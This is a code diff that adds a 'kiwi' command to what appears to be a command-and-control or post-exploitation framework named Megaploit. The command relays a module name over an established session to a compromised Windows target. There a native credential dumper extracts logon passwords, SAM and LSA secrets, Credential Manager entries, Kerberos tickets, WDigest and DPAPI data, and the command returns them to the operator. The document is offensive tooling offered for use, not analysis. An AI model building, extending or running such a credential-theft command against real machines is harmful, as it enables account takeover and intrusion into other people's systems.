@@ -1576,6 +1576,61 @@ def cmd_interactive(session: Session, args: list[str]) -> CommandResult:
     return _ok(recv_msg(session.conn))
 
 
+# ---------------------------------------------------------------------------
+# Kiwi — native C credential dumper
+# ---------------------------------------------------------------------------
+
+@_cmd("kiwi", usage="kiwi <module>",
+      help_text=(
+          "Native C credential dumper (Windows).  Modules: "
+          "logonpasswords sam lsa credman tickets wdigest dpapi all"
+      ),
+      dangerous=True)
+def cmd_kiwi(session: Session, args: list[str]) -> CommandResult:
+    """
+    Invoke the Megaploit Kiwi native binary on the target.
+
+    The binary is compiled from source on first use — requires MinGW-w64 or
+    MSVC present on the *target* machine, OR a pre-built megaploit_kiwi.exe
+    already uploaded there.
+
+    Usage examples
+    --------------
+      kiwi logonpasswords
+      kiwi sam
+      kiwi credman
+      kiwi all
+    """
+    if not args:
+        return _err(
+            "Usage: kiwi <module>\n"
+            "  Modules: logonpasswords  sam  lsa  credman  tickets  wdigest  dpapi  all"
+        )
+    module = args[0].lower()
+    VALID = {"logonpasswords", "sam", "lsa", "credman",
+             "tickets", "wdigest", "dpapi", "all"}
+    if module not in VALID:
+        return _err(
+            f"Unknown kiwi module: '{module}'\n"
+            f"  Valid: {', '.join(sorted(VALID))}"
+        )
+
+    payload = ("kiwi " + " ".join(args)).strip()
+    send_msg(session.conn, payload)
+
+    # kiwi can take a while — bump socket timeout for the long modules
+    old_to = session.conn.gettimeout()
+    session.conn.settimeout(90)
+    try:
+        output = recv_msg(session.conn)
+    except Exception as e:
+        return _err(f"kiwi: receive error — {e}")
+    finally:
+        session.conn.settimeout(old_to)
+
+    return _ok(str(output))
+
+
 def all_commands() -> dict[str, _CommandDef]:
     """Return a snapshot of the command registry (name → _CommandDef)."""
     return dict(_registry)
